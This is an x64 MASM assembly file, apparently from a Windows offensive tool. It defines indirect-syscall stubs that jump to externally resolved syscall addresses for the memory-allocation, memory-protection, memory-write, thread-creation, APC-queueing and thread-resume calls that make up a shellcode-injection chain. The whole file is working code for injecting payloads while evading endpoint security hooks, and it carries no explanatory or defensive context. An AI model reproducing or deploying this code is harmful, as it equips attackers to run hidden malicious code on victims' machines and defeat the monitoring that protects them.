EXTERN wNtAllocateVirtualMemorySSN:DWORD
EXTERN sysAddrNtAllocateVirtualMemory:QWORD

EXTERN wNtProtectVirtualMemorySSN:DWORD
EXTERN sysAddrNtProtectVirtualMemory:QWORD

EXTERN wNtWriteVirtualMemorySSN:DWORD
EXTERN sysAddrNtWriteVirtualMemory:QWORD

EXTERN wNtCreateThreadExSSN:DWORD
EXTERN sysAddrNtCreateThreadEx:QWORD

EXTERN wNtWaitForSingleObjectSSN:DWORD
EXTERN sysAddrNtWaitForSingleObject:QWORD

EXTERN wNtQueueApcThreadSSN:DWORD
EXTERN sysAddrNtQueueApcThread:QWORD

EXTERN wNtResumeThreadSSN:DWORD
EXTERN sysAddrNtResumeThread:QWORD

.CODE ; Start the code section

; Procedure for the NtAllocateVirtualMemory syscall
IndirectSysNtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, wNtAllocateVirtualMemorySSN
    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory]
IndirectSysNtAllocateVirtualMemory ENDP

IndirectSysNtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, wNtProtectVirtualMemorySSN
    jmp QWORD PTR [sysAddrNtProtectVirtualMemory]
IndirectSysNtProtectVirtualMemory ENDP

; Similar procedures for NtWriteVirtualMemory syscalls
IndirectSysNtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, wNtWriteVirtualMemorySSN
    jmp QWORD PTR [sysAddrNtWriteVirtualMemory]
IndirectSysNtWriteVirtualMemory ENDP

; Similar procedures for NtCreateThreadEx syscalls
IndirectSysNtCreateThreadEx PROC
    mov r10, rcx
    mov eax, wNtCreateThreadExSSN
    jmp QWORD PTR [sysAddrNtCreateThreadEx]
IndirectSysNtCreateThreadEx ENDP

; Similar procedures for NtWaitForSingleObject syscalls
IndirectSysNtWaitForSingleObject PROC
    mov r10, rcx
    mov eax, wNtWaitForSingleObjectSSN
    jmp QWORD PTR [sysAddrNtWaitForSingleObject]
IndirectSysNtWaitForSingleObject ENDP

; Similar procedures for NtQueueApcThread syscalls
IndirectSysNtQueueApcThread PROC
    mov r10, rcx
    mov eax, wNtQueueApcThreadSSN
    jmp QWORD PTR [sysAddrNtQueueApcThread]
IndirectSysNtQueueApcThread ENDP

; Similar procedures for NtResumeThread syscalls
IndirectSysNtResumeThread PROC
    mov r10, rcx
    mov eax, wNtResumeThreadSSN
    jmp QWORD PTR [sysAddrNtResumeThread]
IndirectSysNtResumeThread ENDP

END ; End of the module